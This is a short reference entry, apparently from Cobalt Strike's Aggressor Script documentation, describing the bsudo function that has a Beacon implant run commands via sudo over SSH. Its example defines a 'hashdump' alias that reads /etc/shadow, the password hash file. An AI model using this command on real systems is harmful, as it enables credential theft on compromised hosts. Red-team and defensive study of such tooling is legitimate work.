bsudo

Ask Beacon to run a command via sudo (SSH sessions only)

#### Arguments

`$1` - the id for the session. This may be an array or a single ID.

`$2` - the password for the current user

`$3` - the command and arguments to run

#### Example

```
# hashdump [password]
ssh_alias hashdump {
   bsudo($1, $2, "cat /etc/shadow");
}```

